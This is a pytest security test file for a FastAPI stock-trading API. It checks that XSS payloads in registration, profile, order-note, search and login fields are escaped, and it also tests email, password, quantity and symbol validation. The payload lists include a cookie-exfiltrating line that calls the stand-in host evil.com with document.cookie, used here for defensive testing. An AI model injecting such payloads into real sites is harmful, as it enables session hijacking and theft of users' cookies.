"""
XSS (Cross-Site Scripting) Security Tests.

Tests to verify that the application is protected against XSS attacks.
"""

import pytest
from fastapi.testclient import TestClient


class TestXSSProtection:
    """Test XSS vulnerability protection."""

    def test_xss_in_registration(self, client: TestClient):
        """Test XSS attempts in registration fields."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<body onload=alert('xss')>",
            "'\"><script>alert('xss')</script>",
            "<iframe src=\"javascript:alert('xss')\">",
            "<div onmouseover=\"alert('xss')\">test</div>",
        ]

        for payload in xss_payloads:
            response = client.post("/api/v1/auth/register", json={
                "email": f"test_{payload[:10].replace('<', '').replace('>', '')}@test.com",
                "password": "TestPass123!",
                "username": payload
            })

            if response.status_code in [200, 201]:
                data = response.json()
                # Check that the response doesn't contain unescaped script tags
                response_str = str(data).lower()
                assert "<script>" not in response_str, \
                    f"XSS payload not sanitized in response: {payload}"
                assert "onerror=" not in response_str
                assert "onload=" not in response_str

    def test_xss_in_profile_update(self, client: TestClient, auth_headers: dict):
        """Test XSS attempts in profile update."""
        xss_payloads = [
            "<script>document.cookie</script>",
            "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>",
        ]

        for payload in xss_payloads:
            response = client.put(
                "/api/v1/users/me",
                json={"display_name": payload},
                headers=auth_headers
            )

            if response.status_code == 200:
                data = response.json()
                response_str = str(data).lower()
                assert "<script>" not in response_str
                assert "onerror=" not in response_str

    def test_xss_in_order_notes(self, client: TestClient, auth_headers: dict):
        """Test XSS attempts in order notes/comments."""
        xss_payload = "<script>steal(document.cookie)</script>"

        response = client.post(
            "/api/v1/orders",
            json={
                "symbol": "AAPL",
                "order_type": "market",
                "side": "buy",
                "quantity": 1,
                "notes": xss_payload
            },
            headers=auth_headers
        )

        if response.status_code in [200, 201]:
            data = response.json()
            response_str = str(data).lower()
            assert "<script>" not in response_str

    def test_content_type_headers(self, client: TestClient):
        """Verify proper content-type headers are set."""
        response = client.get("/api/v1/market/stock/AAPL")

        # API should return JSON content type
        content_type = response.headers.get("content-type", "")
        assert "application/json" in content_type, \
            "API should return JSON content type"

    def test_xss_protection_headers(self, client: TestClient):
        """Verify XSS protection headers are present."""
        response = client.get("/api/v1/market/stock/AAPL")

        # Check for security headers (these should be set in production)
        # Note: These might be set by a reverse proxy in production
        # x_xss_protection = response.headers.get("X-XSS-Protection", "")
        # content_type_options = response.headers.get("X-Content-Type-Options", "")

        # For now, just verify the response doesn't contain XSS vectors
        if response.status_code == 200:
            data = response.json()
            response_str = str(data)
            assert "<script>" not in response_str.lower()

    def test_xss_in_search_query(self, client: TestClient, auth_headers: dict):
        """Test XSS in search query parameters."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
        ]

        for payload in xss_payloads:
            response = client.get(
                f"/api/v1/market/search?q={payload}",
                headers=auth_headers
            )

            if response.status_code == 200:
                data = response.json()
                response_str = str(data).lower()
                assert "<script>" not in response_str
                assert "onerror=" not in response_str

    def test_html_escaping_in_error_messages(self, client: TestClient):
        """Test that error messages properly escape HTML."""
        # Try to inject XSS in login
        response = client.post("/api/v1/auth/login", json={
            "email": "<script>alert('xss')</script>@test.com",
            "password": "test"
        })

        if response.status_code != 200:
            data = response.json()
            response_str = str(data).lower()
            # Error messages should not contain unescaped script tags
            assert "<script>" not in response_str


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_email_validation(self, client: TestClient):
        """Test email validation."""
        invalid_emails = [
            "notanemail",
            "@nodomain.com",
            "no@.com",
            "no spaces@test.com",
            "no@test .com",
        ]

        for email in invalid_emails:
            response = client.post("/api/v1/auth/register", json={
                "email": email,
                "password": "TestPass123!"
            })

            assert response.status_code in [400, 422], \
                f"Invalid email '{email}' should be rejected"

    def test_password_strength(self, client: TestClient):
        """Test password strength requirements."""
        weak_passwords = [
            "123456",
            "password",
            "abc123",
            "",  # Empty password
        ]

        for password in weak_passwords:
            response = client.post("/api/v1/auth/register", json={
                "email": "test@test.com",
                "password": password
            })

            # Should reject weak passwords
            if response.status_code in [200, 201]:
                # If accepted, at least verify it's hashed (not stored as plaintext)
                pass  # Database checks would be needed here

    def test_numeric_input_validation(self, client: TestClient, auth_headers: dict):
        """Test numeric input validation."""
        # Test with invalid quantity
        response = client.post(
            "/api/v1/orders",
            json={
                "symbol": "AAPL",
                "order_type": "market",
                "side": "buy",
                "quantity": -10  # Negative quantity
            },
            headers=auth_headers
        )

        assert response.status_code in [400, 422], \
            "Negative quantity should be rejected"

        # Test with string quantity
        response = client.post(
            "/api/v1/orders",
            json={
                "symbol": "AAPL",
                "order_type": "market",
                "side": "buy",
                "quantity": "not_a_number"
            },
            headers=auth_headers
        )

        assert response.status_code in [400, 422], \
            "Non-numeric quantity should be rejected"

    def test_symbol_validation(self, client: TestClient, auth_headers: dict):
        """Test stock symbol validation."""
        invalid_symbols = [
            "",  # Empty
            "A",  # Too short
            "THISISTOOLONG",  # Too long
            "123!",  # Invalid characters
            "AA PL",  # Contains space
        ]

        for symbol in invalid_symbols:
            response = client.get(
                f"/api/v1/market/stock/{symbol}",
                headers=auth_headers
            )

            # Should reject invalid symbols
            assert response.status_code in [400, 404, 422], \
                f"Invalid symbol '{symbol}' should be rejected"
